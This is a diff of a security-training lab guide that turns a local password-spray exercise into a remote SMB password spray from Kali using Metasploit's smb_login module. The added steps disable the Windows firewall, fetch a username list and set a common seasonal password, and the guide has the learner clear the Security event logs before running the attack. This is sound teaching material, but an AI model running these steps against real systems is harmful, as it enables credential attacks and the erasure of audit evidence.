@@ -17,6 +17,16 @@ Let's get started by opening a **Command Prompt** terminal by clicking on the ic
 
 ![](attachments/OpeningWindowsCommandPrompt.png)
 
+Let's first get our IP address for your Windows system.  We will be using this later.
+
+<pre>ipconfig</pre>
+
+Next, let's make sure the firewall is down.  This will allow us to configure the system to match what many internal systems have.
+
+No firewall.....  So much for defense in depth.
+
+<pre>netsh advfirewall set allprofiles state off</pre>
+
 Once the terminal opens, navigate into the appropriate directory by running the following command:
 
 <pre>cd \IntroLabs</pre>
@@ -42,59 +52,66 @@ Let this run all the way through.
 
 **Even though it looks endless, it's not!**
 
-We will need to start **PowerShell** to run **"LocalPasswordSpray"**
+Now we need to get our attack system ready,
 
-Launch it by typing the following and hitting enter:
+First, let’s start up a Kali instance:
 
-<pre>powershell</pre>
+<img width="81" height="75" alt="image" src="https://github.com/user-attachments/assets/15d9793c-15c8-498d-9b10-4a8303b92d62" />
 
-Run the following two commands:
+Next, let's become root:
 
-<pre>Set-ExecutionPolicy Unrestricted</pre>
+<pre>sudo su -</pre>
 
-<pre>Import-Module .\LocalPasswordSpray.ps1</pre>
+Now, let's get a user list:
 
-It should look like this:
-
-![](attachments/powershellcommands.png)
-
-Let’s try some password spraying against the local system!
-
-<pre>Invoke-LocalPasswordSpray -Password Winter2025</pre>
+<pre>wget https://raw.githubusercontent.com/strandjs/IntroLabs/refs/heads/master/users.txt
+</pre>
 
 It should look like this:
 
-<img width="773" height="479" alt="image" src="https://github.com/user-attachments/assets/da81e7e5-c713-4a02-ac87-326f9aa5f8f5" />
+<img width="662" height="513" alt="image" src="https://github.com/user-attachments/assets/f6f654c5-ad2d-4c8f-b8da-22ccacebc2dc" />
 
 
-We need to clean up and make sure the system is ready for the rest of the labs.
+Please note this list would be acquired by running recon on sites like LinkedIn and possibly a company directory.
 
-Run the following two commands:
+Now, let's start up and configure Metasploit for the remote attack!
 
-<pre>exit</pre>
+<pre>msfconsole -q</pre>
 
-<pre>user-remove.bat</pre>
+<pre>use auxiliary/scanner/smb/smb_login</pre>
 
-![](attachments/exit.png)
+<pre>set RHOST 10.10.124.217</pre>
 
-Let this run all the way through. 
+#Remember!! Your IP address will be different!!!!!
 
-**Even though it looks endless, it's not!**
+<pre>set USER_FILE users.txt</pre>
 
-***
-***Continuing on to the next Lab?***
+<pre>set SMBPASS Winter2025</pre>
 
-[Click here to get back to the Navigation Menu](/IntroClassFiles/navigation.md)
+It should look like this:
 
-***Finished with the Labs?***
+<img width="663" height="323" alt="image" src="https://github.com/user-attachments/assets/85491c23-0eab-4f68-94ca-03f91529aa1b" />
 
 
-Please be sure to destroy the lab environment!
+But wait!!!! Before we run it we should clear the event logs so it is easier to see the attack!
 
-[Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)
+Let's open event viewer on Windows.
 
-[Return To Lab List](https://github.com/strandjs/IntroLabs/blob/master/IntroClassFiles/navigation.md)
+<img width="347" height="624" alt="image" src="https://github.com/user-attachments/assets/bca40bdc-c325-419b-8f20-28de81f96f9e" />
 
----
+Next, let's right-click on the Security events and clear them.
+
+<img width="326" height="383" alt="image" src="https://github.com/user-attachments/assets/94e4a7d7-568b-4e76-bb72-fd3d223193d1" />
+
+When it asks you to clear, just Clear.  No need to save.
+
+Now, let's go back to the Kali system and run our attack.
+
+<pre>run</pre>
+
+It should look like this:
+
+<img width="660" height="416" alt="image" src="https://github.com/user-attachments/assets/0fc467f2-adae-4214-af29-a4997f4df949" />
+
 
 
